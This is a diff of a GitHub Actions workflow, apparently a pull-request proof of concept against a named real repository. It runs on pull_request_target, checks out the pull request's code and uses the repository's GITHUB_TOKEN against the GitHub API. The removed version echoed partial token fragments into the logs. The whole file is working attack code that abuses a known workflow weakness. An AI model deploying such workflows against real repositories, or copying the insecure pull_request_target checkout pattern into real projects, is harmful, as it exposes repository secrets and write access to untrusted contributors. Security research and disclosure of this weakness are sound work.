@@ -1,20 +1,47 @@
-name: PoC - Obfuscated GitHub Token
+name: PoC - Verify GITHUB_TOKEN Context
 
 on:
   pull_request_target:
+    types: [opened, synchronize, reopened]
+
+permissions:
+  contents: read
+  actions: read
 
 jobs:
-  token-exposure:
+  verify-token-context:
     runs-on: ubuntu-latest
+
     steps:
       - name: Checkout PR code
         uses: actions/checkout@v3
 
-      - name: Prove GITHUB_TOKEN Access (Obfuscated)
+      - name: Verify GITHUB_TOKEN Repository Context
         run: |
-          TOKEN="${{ secrets.GITHUB_TOKEN }}"
+          echo "=== Proof of Concept: GITHUB_TOKEN Context Verification ==="
 
-          echo "=== Proof of Concept ==="
-          echo "Token length: ${#TOKEN}"
-          echo "Token prefix: ${TOKEN:0:16}****"
-          echo "Token suffix: ****${TOKEN: -16}"
+          echo "[*] Calling GitHub API with GITHUB_TOKEN..."
+
+          RESPONSE=$(curl -s \
+            -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" \
+            -H "Accept: application/vnd.github+json" \
+            https://api.github.com/repos/SvavaCapital/svava-terraform-github-actions)
+
+          echo ""
+          echo "Repository full name:"
+          echo "$RESPONSE" | jq -r '.full_name'
+
+          echo ""
+          echo "Repository owner:"
+          echo "$RESPONSE" | jq -r '.owner.login'
+
+          echo ""
+          echo "Default branch:"
+          echo "$RESPONSE" | jq -r '.default_branch'
+
+          echo ""
+          echo "Visibility:"
+          echo "$RESPONSE" | jq -r '.visibility'
+
+          echo ""
+          echo "=== End of PoC ==="
